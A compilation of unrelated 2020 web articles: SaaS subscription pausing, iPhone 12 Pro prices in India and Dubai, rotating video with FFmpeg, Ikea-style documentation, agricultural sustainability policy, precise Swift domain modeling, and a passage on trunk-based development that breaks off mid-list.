the preferences are different from person to person and they change over time. And that's the exact reason why people cancel their subscription with your service: Their preferences have changed and they might want to take a pause from your service or need something else entirely.</p><h2 id="churn-baby-churn">"Churn Baby Churn"</h2><p>Now that we know why your customers churn, it's time to get into their shoes and think about ways to keep them around.</p><p>One of the "industry" standards is to send out a survey once they're about to leave to gather feedback and convince them to stay. Some services offer coupon codes if for example the user has clicked on the "it's too expensive" option in the survey.</p><p>Other tactics are more on the "dark patterns" side of things. Hiding buttons, asking double negative questions or using other techniques to make it nearly impossible to leave. Needless to say that customers of businesses practicing such tactics aren't the ones who spread the word on how awesome the product is. Quite the opposite.</p><p>But let's take a step back for a minute and ask ourselves why this "should I stay or should I go" question has to be binary in the first place. Isn't there something "right in the middle"? Something where a user can stay but somehow go at the same time?</p><h2 id="wait-a-minute-or-a-month-">"Wait a minute... or a month..."</h2><p>The solution to this dilemma is dead simple and obvious, yet rarely used: Make it possible to <strong>pause the subscription</strong>.</p><p>Yes, it's that simple. Just offer a way to pause a subscription and get back to it once your users current circumstances have changed.</p><p>Now you might think that it's a really bad idea to let users pause their subscription. They'll pause and never come back. So essentially it's a "passive churn" as they haven't left the platform yet but might never use it again. The stale user data is sitting in the database and your dashboards are still showing hockey-stick growth. Furthermore it's a huge implementation effort as pausing and resuming subscriptions isn't something considered business critical and hence wasn't implemented just yet.</p><p>Those are all valid concerns and some of them might turn out to be true even if you have a "pause- and resume your subscription" system in place. But let's take a seconds to look at the other side of the equation.</p><h2 id="why-pausing-is-a-good-idea">Why pausing is a good idea</h2><p>They very first thing that comes to mind is the COVID-19 pandemic we're currently in. A lot of business scaled back and hence had to cancel subscriptions to their favorite SaaS tools to cut costs. A common "save the customer tactic" used here was to get in touch with the business owner and offer heavy discounted year long subscription plans. That way businesses could reassess if they should really quit and leave the huge discount on the table or just go with it and double down to benefit from the sweet, discounted multi-year subscription deal.</p><p>Letting business put their subscription on hold would be another strategy that could be used to help retain and eventually reactivate your users during this pandemic. Put yourself into your customers shoes again for a minute. Wouldn't you want to pay it back in the future if your supplier lent you a helping hand and wasn't "forcing" you out the door?</p><p>Even if your customers pause their account you still have their E-Mail address to reach out to them and keep them informed about your product. In fact you should use this opportunity to stay in touch, ask them how they're doing and providing something of value along the way. That way you keep the communication "warm" and your business stays on "their radar". There's a higher likelihood that they think about your service when times have changed and they're about to scale things up again.</p><p>Having a way to pause a subscription is an action that's usually taken with some level of consideration. If your customer wants to quit (s)he'll just cancel the subscription anyway. Offering a way to pause for the time-being is another option your users might just not have right now, so they're forced to make a very binary decision and therefore they just quit.</p><p>What you should also think about is that pausing a subscription doesn't necessarily mean that you'll lose revenue for sure. There are different and very creative ways in which you can implement the pause. My gym for example simply extends my membership for the amount of months I put my membership on hold. In the summer I make use of this feature since I do my workouts outside anyways. However those 3-4 months I "save" are simply "added" to my contract. I just have a little bit more control about how and where I spend my time with sports. You can get really creative here and invent other ways for this mechanism to work if you really want to ensure that you don't lose revenue.</p><p>A last, important point is that you can use this functionality as a competitive advantage and "marketing material". Be sure to add the fact that people can pause their subscription to your list of product benefits. Add it to the copy right next to your "Subscribe Now" button. Addressing objections and concerns right before the call-to-action is about to happen will drastically increase your conversion rates.</p><h2 id="things-to-keep-in-mind-when-going-down-that-path">Things to keep in mind when going down that path</h2><p>Now you might be excited and eager to implement this strategy in the near future but before you do so I'd like to call out a couple of things you should keep in mind when implementing it.</p><p>First of all: <strong>Keep it simple</strong>. There's no need to jump right into code and implement this functionality end-to-end. Do it manually in the beginning. Update the database records and the subscription plans for people who want to pause their subscription by hand. Maybe you find out that very few people want to make use of this feature. What you definitely want to put in place is your new copywriting. As discussed above you should ensure that your marketing website is updated and reflects the recent change you just introduced.</p><p>Next up you want to have an <strong>automated follow-up E-Mail sequence</strong> / Drip campaign setup for pausing customers. Keep in touch. Ask for problems they had with your software and help them succeed in whatever they're up to right now. You might want to jump on a quick call to gather some feedback as to why they paused and understand what needs to be in place for them to come back. If you do this, please ensure that you're <strong>genuinely interested</strong> in the communication. There's nothing worse for a user than composing a reply and shooting the E-Mail into the marketing void.</p><p>A very important, yet often overlooked step is to have a tool in place which deals with "passive churn". Such a system ensures that the credit cards on file are up to date and chargeable. There could be an overlap between your users pausing their subscription and their credit cards expiring. You don't want to make them look bad because of that. You could even think about a "concierge service" which onboards them in person once they'll come back. Combine this with a quick update on all the new features / updates they missed and are not yet familiar with.</p><p>Lastly you absolutely don't want to make it hard for your users to pause their subscription. As mentioned above, avoid dark patterns at all costs. And more importantly: <strong>Don't penalize them for pausing</strong>. Messages such as "We'll retain your data for the next 60 days" are inappropriate in the day and age of "Big Data" and access to Petabytes of storage for a nickel and dime.</p><h2 id="your-challenge">Your challenge</h2><p>I'd like to challenge you to think about adding the possibility to pause a subscription. Is it suitable for your business? Would it help you retain and reactive more customers (especially in the current situation we're in)?</p><p>If you're about to add it, keep in mind that it doesn't have to be complicated. Start with a simple E-Mail form your users can fill out to let you know for how long they want to pause. Just make sure that you follow the best practices outlined above and that you advertise that it's now possible for your customers to pause their subscriptions.</p><h2 id="conclusion">Conclusion</h2><p>Customer retention is one of the most important metrics every business owner should focus on. It's the existing customers who finance the Customer Acquisition Costs that are necessary to bring new users into the door.</p><p>It's almost always cheaper to keep your existing …</p></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Apple launched four new iPhones including the iPhone 12 Mini, iPhone 12, iPhone 12 Pro, and iPhone 12 Pro Max. Out of all the four new releases, only two will be available in India for now- the iPhone 12 and iPhone 12 Pro. Soon after the new iPhones were announced, Apple discontinued the iPhone 11 Pro and iPhone Pro Max. The company also reduced the prices of its existing iPhones including the iPhone 11, iPhone XR, and iPhone SE.</p><p>The Apple iPhone 12 is priced starts at Rs 69,900 for the base variant whereas the iPhone 12 Pro costs Rs 1,19,900 for the base variant. Well, that is not something unexpected. Considering the previous trends, the iPhone Pro models are released with an exorbitant price tag. Now to add to the woes of people looking to buy the iPhone 12 Pro, they should know that the Apple iPhone 12 Pro is more expensive in India than in any other country. Dubai for instance sells the iPhone 12 Pro for Rs 84,000.</p><p>Now this rings a bell. The iPhone 12 Pro is comparatively cheaper in Dubai. So cheap that you can actually go to Dubai, buy the phone and come back. Let us explain the math to you for a better understanding.</p><p><strong>iPhone 12 Pro Price in India for 128 GB:</strong> Rs 1,19,000</p><p><strong>iPhone 12 Pro Price in Dubai for 128GB: </strong>Rs 84,000. It costs Dh 4,199 in Dubai and if you convert the currency to INR, the price comes down to almost Rs 84,000.</p><p>So, should this mean that you can go to Dubai, buy the phone and then come back? Well, if you ask me. It is not that bad an idea. The 12 Pro will go on sale from November 6. So you book a flight for Dubai from Delhi or Kolkata for November 6 or later than that, you can get the return ticket for a little over Rs 18,000.</p><p>Below is the exact amount, you would be spending on your flight tickets to Dubai from New Delhi. However, the amount might change depending on the availability but this is what we found when tried booking a ticket to Dubai.</p><p><em>Flight ticket: Indigo Rs 17929 approx<br>iPhone 12 Pro 128GB: 84,000<br>Some other expenses: Around Rs 10,000<br>Total: Around Rs 1,11,929<br>Money saved: Around Rs 8000</em></p><div> <p><img data-src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202010/Screenshot_2020-10-21_at_12.19-1200x742.png?EZDB1F4V_MBUFqe1VNjueddsHKGJgQ7S" src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202010/Screenshot_2020-10-21_at_12.19-1200x742.png?EZDB1F4V_MBUFqe1VNjueddsHKGJgQ7S" alt=""></p></div><p>Now, considering that the world is battling coronavirus pandemic and the virus is in no mood to slow down, we do not encourage anyone to travel. The whole idea was to not send you to Dubai but to draw your attention towards Apple’s exorbitant pricing in India. It is no secret that the taxes and duties that are applied to imported phones are highest in India. The taxes are so high that for an important iPhone that you will end up paying an average tax of Rs 24,000 for something like an iPhone 12 or iPhone 12 Mini.</p><p>However, despite the sky-rocketing prices, iPhone still sells best in India and the buyers give whatever price Apple asks them to pay.

<p>Sometimes when a video is captured wrong due to bad technique or simply bad luck, its useful to have a simple way to rotate it either clockwise or anti-clockwise. </p>



<p>Lucky for us, FFmpeg <a aria-label="has a filter  (opens in a new tab)" href="https://ffmpeg.org/ffmpeg-filters.html#transpose-1" target="_blank" rel="noreferrer noopener nofollow">has a filter</a> to rotate a video by specifying the direction. It takes a video as the input and a set of commands that you can use to instruct FFmpeg on how to rotate the video, and then FFmpeg will take care of the rest. </p>




<h2><span id="How_to_Rotate_a_Video_90%C2%B0_With_FFmpeg"></span>How to Rotate a Video 90° With FFmpeg?<span></span></h2>



<p>Here is the command line for rotating a video using FFmpeg’s <code>transpose</code> filter. </p>



<pre><code><code>ffmpeg -i inputVideo.mp4 -vf "transpose=dir=1" rotatedVideo.mp4</code></code></pre>



<p>You are using the <code>transpose</code> filter using <code>-vf</code> in FFmpeg. This takes a set of parameters to control the direction of the transpose/flip/rotate operation and to prevent the transpose from taking place. </p>



<p>Let’s learn more about this. </p>



<p>Here are the options that are available in FFmpeg to rotate a video. You can either mention a number from 0 – 4 or the words <code>cclock_flip</code>, <code>clock</code>, <code>cclock</code>, or <code>clock_flip</code>.</p>



<pre><code><code>0/cclock_flip = 90 degrees CounterCLockwise and Vertical Flip (default)</code><br><code>1/clock = 90 degrees</code> <code>Clockwise</code><br><code>2/clock = 90 <code>degrees</code> CounterClockwise</code><br><code>3/clock_flip = 90 <code>degrees</code></code> <code>Clockwise and Vertical Flip</code></code></pre>



<h2><span id="How_to_Rotate_a_Video_180%C2%B0_With_FFmpeg"></span>How to Rotate a Video 180° With FFmpeg?<span></span></h2>



<p>Let’s look at this use case now. How do you rotate a video 180° using the transpose command?</p>



<pre><code><code>ffmpeg -i inputVideo.mp4 -vf "transpose=dir=2:transpose=dir=2" rotatedVideo.mp4</code></code></pre>



<p> I used the ParkJoy sequence and flipped it 180 using this command. You can see the result for yourself in the video below. So basically, you are instructing FFmpeg to rotate the video 90 degrees counter-clockwise two times which totals up to 180 degrees.</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/470871248" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<h2><span id="How_to_Prevent_Rotation_for_Landscape_or_Portrait_Modes"></span>How to Prevent Rotation for Landscape or Portrait Modes?<span></span></h2>



<p>A typical use case for this is for post-processing videos captured from your mobile phone – some are probably in portrait mode and some are in landscape mode. </p>



<p>Now, if you use FFmpeg to process them as a batch, you probably want a way to tell FFmpeg to <strong>not rotate videos</strong> that are either in landscape or portrait mode. </p>



<p>Thankfully, there is an option for that as well in FFmpeg’s <code>transpose</code> filter.</p>



<pre><code>ffmpeg.exe -i parkjoy.mp4 -vf "transpose=dir=2:passthrough=landscape" parkjoy-90-flip.mp4</code></pre>



<p>The above commandline says that FFmpeg should transpose the video 90 degrees CounterClockwise ONLY if the video is NOT landscape mode. </p>



<h2><span id="Conclusion"></span>Conclusion <span></span></h2>



<p>I hope you understood how to rotate a video using FFmpeg. If you liked this, please let us know in the comments section, share the post with your friends, and <a href="https://ottverse.com/category/ffmpeg/">check out the rest of our FFmpeg tutorials.</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2><em>It’s time to start loving Ikea’s infamous instruction manuals</em></h2><p>The mindset of how most people first approach technical documentation, including myself, is perfectly summed up into a piece of popular wisdom, saying:</p><blockquote>Ain’t nobody got time for that!</blockquote><p>Totally explainable. Up to a point.</p><p>Technical documentation seems to take perfectly functional lines of code and break them down into boring, useless explanations.</p><p>Plus, if you are the developer who wrote the code, it’s only natural to think you will make sense of what your very own logic produced. And if you’re not, then you probably can find out by ringing that guy at any time of the working days, and even on the weekends. Let’s face it, you’re close enough. You’re one of the few team members of a tech company so small that it doesn’t have a technical writer.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f7178312623813d346b8936/5f9013020b20144e22e79a62_employee%20of%20the%20month.gif" loading="lazy" alt=""></p></figure><p>But maybe that’s just the problem.</p><p>What your growth strategy lacks is a more user-oriented approach.</p><p>Technical manuals and documentation tell us more than how to use an app or any other product. They are the number one tool reflecting how much of your energy goes into UX design. And UX design shows how much importance your users hold. Which should be a lot.</p><p>So do you want to generate more traction for your business?</p><p>Then maybe a ReadMe is what you need.</p><p>If it sounds far-fetched, then let’s take a look at one of the most popular companies that produce hardware and break down their technical process into a step-by-step technical guide. And that is Ikea. OK, maybe that’s not a regular hardware manufacturer, but it’s close enough. And there certainly is a solid, worldwide fanbase the company has.</p><p>One of the reasons why is the usability of their products.</p><p>The best thing about Ikea is also the worst: their very detailed, almost never-ending instruction manuals. As soon as you open an Ikea manual, putting together the pieces of a chair seems like rocket science. That’s because they take their documentation very seriously. But it’s only when trying to switch to other brands that you realize how useful those stacks of explicit instructions really are.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f7178312623813d346b8936/5f90137cb2ae71321fefa4e9_come%20back%20to%20me%2C%20buddy.gif" loading="lazy" alt=""></p></figure><p>If you want to achieve the same attachment to your products, follow for your documentation the same set of 3 easy principles that Ikea applies in their manuals.</p><h3>1. <strong>Focus on your user</strong></h3><p>A lot of companies make the error of getting the engineers or product designers to write the documentation for themselves. But actually, they know their products too well. So, they don’t find it necessary. They always delay until the very end, don’t put much time into making it and leave out many important aspects.</p><p>Don’t worry, this is a frequent mistake.</p><p>Fix it easily by switching from a developer perspective to a user perspective. They might look alike but differ greatly.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f7178312623813d346b8936/5f901494084f42a8f94ed23a_user%20perspective%20gif.gif" loading="lazy" alt=""></p></figure><h3>2. <strong>See the bigger picture</strong></h3><p>You need the consumer, or the end user, to understand how they relate to the technology you offer. And as soon as they do so, they’re hooked.</p><p>Good documentation increases customer loyalty and ensures that they will buy your other products in the future. It can also be a great selling tool for prospective customers because it gives them a clear idea of how they might use your product, and what they could achieve with it.</p><p>So get out of your box. Zoom out. Don’t disregard your customer’s emotions. In the end you’ll have to adopt a broader view anyway, and if it takes you too long, the sight won’t be a delight.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f7178312623813d346b8936/5f90158c1f4c0a261b5e145b_friends%20gif.gif" loading="lazy" alt=""></p></figure><h3>3. <strong>Never too many details</strong></h3><p>Quality user information is the most cost-effective way of answering the questions that your customers will encounter when using your product; otherwise they’ll call you for the answer, a far more expensive solution.</p><p>Let’s go back to Ikea. How could they deal with offering support to every customer who doesn't know which screw goes where? They couldn’t. And it’s more than understandable why they wouldn’t.</p><p>Good documentation is an essential part of the complete package, not an afterthought or last-minute addition. Put aside time to create it all along the development of the product.</p><p>You designed your product with high design values and attention to detail – now apply the same standards to your documentation.</p><h2><strong>There’s more to documentation than your user</strong></h2><figure><p><img src="https://uploads-ssl.webflow.com/5f7178312623813d346b8936/5f9015f41a48015bc198092c_more%20than%20user%20gif.gif" loading="lazy" alt=""></p></figure><p>I know what you’re thinking: it seems like my ramble amounted to nothing.</p><p>That is not what I’m saying. The 3 principles built around your customer will prove to be very useful as a sales technique for your product and as a business growth tool.</p><p>What I’m saying is, it gets better.</p><p>Good documentation also works as an internal tool, both after it’s completed and in the process of creating it. Putting information together will help bring everyone in your team on the same page.</p><p>Moreover, it boosts the flexibility of your work environment, allowing employees to work hours that differ from the normal company start and stop time. That’s because everybody knows everything about everything, since all knowledge is centralized in the same place.</p><p>At <a href="https://archbee.io/">Archbee</a>, we always hear from our customers that our documentation software has the most impact on the quality of collaboration inside teams. Empowering people to work real-time on the same documents really gives them the feeling of being part of a community, as well as a sense of security. Everybody knows where to go for accountable data. Documentation is always reliable and works as a community aggregator.</p><h2>Conclusion</h2><p>Whatever product or system you’re writing documentation for, people reading it go through a mental journey of learning, understanding and applying that documentation. Be it your users or your own team, use the information that’s already in your company to help you scale up to the next level.</p><p>At the end of the day, internal documentation isn’t just about providing instruction manuals for your company’s products or services; it’s a means of communication. While it may feel like it’s an incredibly time-consuming, boring piece of paperwork that nobody is going to read, it’s actually something that is essential to keeping any business running smoothly. When it’s available, thorough, and well written, people will read what is necessary to know how todo their jobs correctly. And if you want your organization to run as smoothly as possible, that’s a good place to start.</p><p>Plus, the next time somebody asks you why you’re putting up with this tedious process of writing technical documentation, you have the chance to ask them in return, ”When is the last time you googled for Ikea instructions?”</p><p>That should do it.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f7178312623813d346b8936/5f90168e736a7b8acf40b966_bring%20it%20on%20gif.gif" loading="lazy" alt=""></p></figure></div></div><div><div><h3>Read more information about team work, documentation and knowledge management.<br></h3><div><p>And use everything in your work with distributed and remote teams,<br>to be more effective and organized.</p></div><div><div><p>Thank you!

All of these press releases and news articles speak of ‘bold’ action to ‘drive sustainability’ for farmers and consumers. These are noble causes and I don’t deny most people in these companies seriously believe they will be apart of the solution. Like many other industries, agriculture must try and improve some environmentally unfriendly practices in order to follow through a broad sense call-to-arms from society at large. Also, like many other industries, agriculture figure out ways to do this and retain (or rethink) profitability and economic model <em>along with</em> the added difficultly of providing reliable and safe food sources for that same society. We could have sustainable farming within a few years time, but we would also see food prices soar to riot inducing levels.</p>



<p>The elephant in the room with these agriculture companies that are so eager to adapt more environmentally friendly practices is their business model depends on annual row crops being planted on ever growing acreage and supplemented with the latest and great biotechnology traits, fertilizers, herbicides, pesticide, seed treatments, etc. One <em>possible</em> part of bringing agriculture to a more sustainable state involves <em>decreasing</em> acreage of crops like maize, soybean, wheat, and cotton. This is why I will always maintain that current multinational agriculture input will not solve (or even improve) sustainability issues associated with modern agriculture. They are simply aligning themselves with public-friendly talking points that gives them some good public relations. In a capitalistic sense, these companies thrive when crop production is increasing. There revenue streams do not match their press releases. This is analogous to the automobile industry giants [Ford, Chrysler, Honda, Toyota] that were never going to solve the electric vehicle problem because it was <em>bad for business</em>; these companies only started truly paying attention when it appeared Tesla would start eating into their profits and market share. A funny thing about Tesla: it owes a <a rel="noreferrer noopener" href="https://www.latimes.com/business/la-fi-hy-musk-subsidies-20150531-story.html" data-type="URL" data-id="https://www.latimes.com/business/la-fi-hy-musk-subsidies-20150531-story.html" target="_blank">large piece of its success</a> due to the <a rel="noreferrer noopener" href="https://www.tesla.com/blog/tesla-repays-department-energy-loan-nine-years-early" data-type="URL" data-id="https://www.tesla.com/blog/tesla-repays-department-energy-loan-nine-years-early" target="_blank">United States government</a>. No commercial bank was willingly to give Tesla money to do what he wanted–except for the US government because it recognizes subsidizing behavior it deems desirable is a path to get high-risk, high reward ideas off the ground.</p>



<p>This is exactly why I continue to advocate on this blog that the USDA needs to be a strong voice and possible financial backer in the sustainability push agriculture is entering. Right now, the USDA is incentivizing production of maize, soybean, wheat, cotton at all costs via several direct and indirect subsidy programs. There are no downsides risks and some of the consequences include farming marginal ground. A farmer simply has to get the ground in production and there are virtually no risks to losing money. Along the way, these multinational agriculture companies get their cut by selling the seed, fertilizer, chemicals to grow that crop. There is subsidy money already in the <a rel="noreferrer noopener" href="https://www.usda.gov/media/press-releases/2020/09/18/usda-provide-additional-direct-assistance-farmers-and-ranchers" data-type="URL" data-id="https://www.usda.gov/media/press-releases/2020/09/18/usda-provide-additional-direct-assistance-farmers-and-ranchers" target="_blank">budget</a> and delivering it to the people efficiently has been solved (which is an important aspect as the government oftentimes struggles to reach its indented audience effectively). The path to more sustainable farming starts with the USDA. Perhaps the end results is a Tesla-like startup that utilizes a startup loan from the USDA to figure out the incentives of sustainability.</p>



<p>A more sustainable agriculture sector has to reconcile several aspects, some of them directly competing with each other. Most of the maize we grow in the United States ends up used in ethanol for vehicles or used as animal feed. One well-known problem (despite <a href="https://www.eesi.org/articles/view/usda-energy-efficiency-of-corn-ethanol-production-has-improved-significantl" data-type="URL" data-id="https://www.eesi.org/articles/view/usda-energy-efficiency-of-corn-ethanol-production-has-improved-significantl" target="_blank" rel="noreferrer noopener">recent improvement</a>) is that maize isn’t the best crop species to make <a rel="noreferrer noopener" href="http://large.stanford.edu/courses/2014/ph240/dikeou1/docs/net_energy_balance2009.pdf" data-type="URL" data-id="http://large.stanford.edu/courses/2014/ph240/dikeou1/docs/net_energy_balance2009.pdf" target="_blank">ethanol</a>.</p>



<div><figure><img src="https://www.ers.usda.gov/webdocs/charts/83915/cornuse.jpg?v=88.1" alt=""></figure></div>



<p>As electric vehicles take gasoline powered vehicle off the roads, the demand for ethanol should naturally vanish along with the demand for that corn. This will happen, and it will have negative consequence unless these maize acres have another profitable outlet. Simply planting a different crop and flooding those markets will decimate those industry as well. The scale of agriculture is simply too big. We cannot start planting 150M acres of maize or soy rotated ground with cover crops, expect to allow cattle to graze that cover crop, and make the whole system profitable. We have to start pricing land more asymmetrically for its carbon sequestration potential. For some reason this is an unpopular concept in these newly minted carbon markets where 1 ton of sequester carbon is worth ~$15 USD no matter where that acre is located. Conversely, if you want to buy land to farm you might pay <a rel="noreferrer noopener" href="https://ispfmra.org/wp-content/uploads/2018/07/2018-Land-Values-Report-e-version.pdf" data-type="URL" data-id="https://ispfmra.org/wp-content/uploads/2018/07/2018-Land-Values-Report-e-version.pdf" target="_blank">$15,000 USD an acre</a> for prime farm ground in Illinois or <a rel="noreferrer noopener" href="https://extension.sdstate.edu/sites/default/files/2020-07/P-00117.pdf" data-type="URL" data-id="https://extension.sdstate.edu/sites/default/files/2020-07/P-00117.pdf" target="_blank">$1500 USD an acre</a> for not so prime farm ground in South Dakota. That is an order of magnitude difference and is a true reflection of the demand for that asset.</p>



<p>Right now in agriculture we simply do not have a true market. The startups in this space seem to think $5-$15 an acre is fair value for its carbon capturing potential. It doesn’t matter if that land is adjacent to an important river or stream that provides water to communities or is in the middle of nowhere. Land that is the most at risk for erosion or has leeching properties that make it poor candidates for applying synthetic chemicals (that are used by most all non-organic operations) needs to be properly priced. Agriculture <em>is</em> already hyper efficient but it can become moreso by concentrating production of crops where we get the most crop per acre. Someone (Silicon Valley or someone with a big bank) can make this market happen–its going to take fortitude or foresight, but agriculture does not lack those minds.</p>

October 22, 2020 | https://mokacoding.com/blog/pipe-wrench/ | <a href="https://web.archive.org/web/*/https://mokacoding.com/blog/pipe-wrench/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>What can a pipe wrench teach us about software engineering?
A lot, according to <a href="https://en.wikipedia.org/wiki/Vannevar_Bush">Vannevar Bush</a>.</p>
<p>An electrical engineer and professor at MIT, Bush was "one of the most politically powerful inventors in America since Benjamin Franklin," as his biographer <a href="https://geni.us/liVH8">G. Pascal Zachary puts it</a>.
During WWII, he personified the United State's military research, organized the Manhattan Project, and played a crucial role in the Allied victory.
He was also a mentor to <a href="https://en.wikipedia.org/wiki/Claude_Shannon">Claude Shannon</a>, the father of the information age.</p>
<p>One anecdote of Bush's career as an instructor at MIT particularly inspired me: his pipe wrench lecture.</p>
<p>Bush would greet an auditorium filled with aspiring engineers, hold up a pipe wrench, and challenge them: "Describe this".</p>
<p><img src="https://mokacoding.s3.amazonaws.com/2020-10-21-pipe-wrench.jpg" width="70%" alt="image of a pipe wrench"></p>
<p><i>Not the actual pipe wrench showed by Bush, I found this one on Amazon.</i></p>

<p>One by one, they would try, and each time Bush would dissect the description, pointing out where it was vague.</p>
<p>Finally, he would write in precise English a patent application for the wrench:</p>
<blockquote>
<p>By turning the nut to the right or left the movable jaw may be moved either toward or away from the fixed jaw, as may be desirable.
The inner face of the movable jaw is formed at a right angle to its shank, and is also provided with a series of teeth, which pitch or rake on its fellow jaw...</p>
</blockquote>
<p>With this exercise, Bush drilled into the class the value of precision.</p>
<h2 id="precision">Precision</h2>
<p>"Given the pipe wrench, produce the words for that wrench and no other; given the words, produce the wrench.
That, Bush taught his students, was the beginning of engineering", write Soni and Goodman in <a href="https://geni.us/FqRN7P"><em>A Mind at Play</em></a>.</p>
<p>Bush MIT students were electrical engineers, but precision is something software engineers should learn, too.</p>
<p>Precision is fundamental when representing building a model for the domain of the software in code.</p>
<p>One way in which a domain representation can be vague is when it allows inconsistent state to occur.
If you work in a language with a strong type system, like Swift, you can use precise types to make your domain modeling clearer and make undesirable state unrepresentable.</p>
<p>For example, when modeling an operation that can either succeed with some data or fail with an error, you could use a type like this:</p>
<pre><code><span><span>struct</span> <span>Operation</span> </span>{
  <span>let</span> success: <span>Bool</span>
  <span>let</span> data: <span>Data?</span>
  <span>let</span> error: <span>Error?</span>
}
</code></pre>
<p>This type does the job but leaves room for errors: nothing stops you from creating an instance with <code>success</code> true but <code>data</code> nil or one with values in both <code>data</code> and <code>error</code>.</p>
<pre><code><span>let</span> inconsistentOperation = <span>Operation</span>(success: <span>false</span>, data: someData, error: .<span>none</span>)
</code></pre>
<p>Using the <a href="https://developer.apple.com/documentation/swift/result"><code>Result</code> <code>enum</code></a>, you can remove this ambiguity <em>at compile time</em>, making it impossible for both data and error to be set simultaneously.</p>
<pre><code><span><span>struct</span> <span>Operation</span> </span>{
  <span>let</span> result: <span>Result</span>&lt;<span>Data</span>, <span>Error</span>&gt;
}
</code></pre>
<p>Another useful <code>enum</code>, borrowed from the <a href="https://elm-lang.org/">Elm programming language</a>, is <a href="https://github.com/mokagio/RemoteData"><code>RemoteData</code></a>: a way to encapsulate the state of a network operation.</p>
<pre><code><span><span>enum</span> <span>RemoteData</span>&lt;<span>T</span>&gt; </span>{
  <span>case</span> notAsked
  <span>case</span> loading
  <span>case</span> loaded(<span>T</span>)
  <span>case</span> failed(<span>Error</span>)
}
</code></pre>
<p><code>enum</code>s are not the only way tool to make your domain modeling more precise.
<a href="https://github.com/pointfreeco/swift-nonempty"><code>NonEmpty</code></a> uses <a href="https://docs.swift.org/swift-book/LanguageGuide/Generics.html#ID186">type constrained generics</a> to represent <code>Collection</code>s that are not empty.</p>
<pre><code>
<span>let</span> xs = <span>NonEmpty</span>&lt;[<span>Int</span>]&gt;(<span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>)
xs.first + <span>1</span> 
</code></pre>
<p>Using <code>NonEmpty</code> adds clarity to the values you define, possibly avoiding runtime crashes by making it impossible to access via subscript an empty array.</p>
<p>If you had to represent "a collection of unique positive integers where order matters and with at least one element," you could use <code>[Int]</code>, or you could combine <code>NonEmpty</code>, <a href="https://github.com/Weebly/OrderedSet"><code>OrderedSet</code></a>, and <a href="https://developer.apple.com/documentation/swift/uint"><code>UInt</code></a> in <code>NonEmpty&lt;OrderedSet&lt;UInt&gt;&gt;</code>.</p>
<p>Using <code>[Int]</code> might be simpler but leaves the door open for all sorts of inconsistent instances, like an empty array, an array with negative values, or one with more than one occurrences of the same value.
<code>NonEmpty&lt;OrderedSet&lt;UInt&gt;&gt;</code> requires more work but using it will make the compiler help you avoid inconsistent state.</p>

<p>We like to call ourselves software <em>engineers</em>, but sometimes forget that engineering is an applied science.
It is rigorous and methodical.
When building a bridge, an integrated circuit, or a motor, precision matters.
If the parts don't fit, if the power supply is not adequate, if there isn't enough material, things won't work.</p>
<p>With software, we're blessed with having a more malleable medium than our colleagues working in the physical realm.
That shouldn't be an excuse to forget the value of precision.</p>
<p>What are your favorite ways to use the type-system to implement a precise domain model?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>One thing that has really benefited my productivity (and also my general sanity), has been learning
how to take a big task and break it down into smaller, more manageable steps. Big tasks can be
frightening and overwhelming, but if I just keep working on the list of smaller tasks, then somehow,
as if by magic, the big task gets completed.</p>



<h2 id="adding-value">Adding value</h2>

<p>When programming, I take a very specific approach to this breakdown. I make sure that each step is
something that <em>compiles, runs, passes</em> all the tests<em>,</em> and <em>adds value</em> to the codebase<em>.</em> Exactly
what “adds value” means is purposefully left vague, but it can be things like adding a small
feature, fixing a bug, or taking a step towards refactoring the code into better shape (i.e.,
reducing <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwikqYmb_6DsAhXSpZ4KHYm9BhgQFjAHegQIBxAC&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTechnical_debt&amp;usg=AOvVaw1ZJ1dsWoB5Jn1hXvtLGuSZ">technical
debt</a>).</p>

<p>An example of <em>not</em> adding value is adding a new feature, but also introducing ten new bugs. It’s
not clear that the value of the feature outweighs the cost of the bugs, so it might be a net loss.</p>

<p>Another example of not adding value is making the UI prettier, but also make the app run ten times
slower. Again, it’s not clear that the prettier look is worth the performance hit, so it might be a
net loss.</p>

<p>Of course, I can’t always be sure that I’m not introducing bugs, and “value” is inherently
subjective (how much performance is a new feature worth). The important part is the <em>intention</em>. My
<em>intention</em> is to always add value with every single commit.</p>

<p>Basically, what I want to avoid is the “It has to get worse before it gets better”-attitude. Also
known as: “The new system is the modern way to do it. Sure, it has some bugs and runs kind of slow
right now, but once we’ve fixed that, it’s going to be way better than what we had before.” I’ve
seen too many cases where these supposed fixes never happen and the new system, which was supposed
to be better, just made things worse.</p>

<p>Plus, you know, it feels good to add value. If every day I can make a commit and that commit makes
the engine better in some way, that makes me happy.</p>

<h2 id="pushing-to-master">Pushing to master</h2>

<p>In addition to implementing changes through a series of small commits, I also <em>push every one of
those small commits back to the master branch.</em></p>

<p>Note that this is the exact opposite of a <a href="https://guides.github.com/introduction/flow/">feature
branch</a> workflow, instead, it is a form of
<a href="https://cloud.google.com/solutions/devops/devops-tech-trunk-based-development">trunk-based</a>
development:</p>

<ul>
<li><p>In a feature branch workflow developers work on new features in isolated, separate branches of the
code and don’t merge them back to master until they’re “complete”: fully working, debugged,
documented, code reviewed, etc.</p></li>

<li><p>In the trunk-based approach, features are implemented as a series of small individual commits to
the master branch itself. Care must be taken so that everything works even when the features are
